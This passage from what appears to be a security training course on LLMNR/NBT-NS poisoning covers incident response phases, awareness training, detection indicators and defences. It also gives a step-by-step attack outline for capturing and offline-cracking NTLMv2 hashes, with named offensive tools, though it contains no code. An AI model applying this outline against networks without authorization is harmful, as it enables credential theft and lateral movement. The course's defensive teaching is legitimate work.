3. Enable SMB signing across environment
4. Disable LLMNR/NBT-NS immediately
```

#### Eradication Phase
```
1. Remove attacker access and backdoors
2. Patch vulnerable configurations
3. Deploy network segmentation
4. Implement detection mechanisms
```

#### Recovery Phase
```
1. Restore normal operations
2. Monitor for re-compromise attempts
3. Conduct security awareness training
4. Update incident response procedures
```

### Security Awareness Training

#### User Education Topics
- Recognize phishing attempts that lead to network credential exposure
- Report suspicious authentication prompts
- Avoid accessing non-existent network resources
- Use bookmarks instead of typing server names
- Report typos in server names to IT

#### IT Staff Training
- Proper DNS infrastructure configuration
- Secure SMB configuration practices
- LLMNR/NBT-NS risks and mitigations
- Incident detection and response
- Network segmentation best practices

---

## Course Summary

### Key Takeaways

**LLMNR/NBT-NS Poisoning Fundamentals:**
- Exploits Windows name resolution fallback mechanisms
- No authentication required for initial attack
- Captures NTLMv2 hashes for offline cracking
- Effective in default Windows environments
- Works across network segments if not properly isolated

**Attack Methodology:**
1. Gain local network access
2. Deploy poisoning tool (Responder/Inveigh)
3. Wait for name resolution failures
4. Capture authentication attempts
5. Crack captured hashes offline
6. Use credentials for lateral movement

**Critical Defense Strategies:**
- Disable LLMNR and NBT-NS via Group Policy
- Enforce SMB signing on all systems
- Implement network segmentation
- Deploy monitoring and detection
- Regular security awareness training
- Strong password policies

**Detection Indicators:**
- Multiple failed authentication attempts
- NTLM authentication to unusual hosts
- LLMNR/NBT-NS queries for non-existent hosts
- Network traffic to multicast addresses
- Anomalous credential usage patterns

### Tools Reference

**Attack Tools:**
- **Responder**: Primary LLMNR/NBT-NS poisoning tool
- **Inveigh**: PowerShell-based Windows poisoner
- **mitm6**: IPv6 MITM and name resolution attacks
- **ntlmrelayx**: SMB relay and credential forwarding
- **Metasploit**: Auxiliary modules for poisoning

**Cracking Tools:**
- **Hashcat**: GPU-accelerated hash cracking
- **John the Ripper**: CPU-based password cracking
- **Custom wordlists**: Corporate password patterns

**Detection Tools:**
- **Wireshark**: Network traffic analysis
- **Zeek/Suricata**: IDS/IPS detection
- **SIEM solutions**: Log aggregation and correlation
- **PowerShell scripts**: Custom monitoring

**Defense Tools:**
- **Group Policy**: Centralized configuration management
- **Network segmentation**: VLAN and firewall rules
- **SMB configuration**: Signing and encryption
- **Honeypots**: Attack detection systems

### Best Practices Summary

**For Penetration Testers:**
- Always get proper authorization
- Use analysis mode first to assess risk
- Document all captured credentials
- Follow responsible disclosure practices
- Clean up tools and artifacts after testing

**For Defenders:**
- Disable LLMNR/NBT-NS in all environments
- Enforce SMB signing without exceptions
- Implement proper DNS infrastructure
- Deploy comprehensive monitoring
- Regular security assessments
- Maintain updated network documentation

**For Organizations:**
- Include LLMNR/NBT-NS in security baselines
- Regular vulnerability assessments
- Security awareness training programs
- Incident response procedures
- Network architecture reviews
- Password policy enforcement

Remember: LLMNR poisoning remains effective because it exploits default Windows behavior. Proper configuration and monitoring are essential for defense, while understanding the attack mechanics is crucial for both offensive and defensive security professionals.
